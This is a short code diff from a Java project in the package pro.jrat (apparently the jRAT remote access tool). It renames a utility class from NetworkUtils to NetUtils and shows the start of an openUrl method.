@@ -10,7 +10,7 @@ import pro.jrat.ErrorDialog;
 import pro.jrat.net.WebRequest;
 
 
-public class NetworkUtils {
+public class NetUtils {
 
 	public static void openUrl(String str) {
 		try {
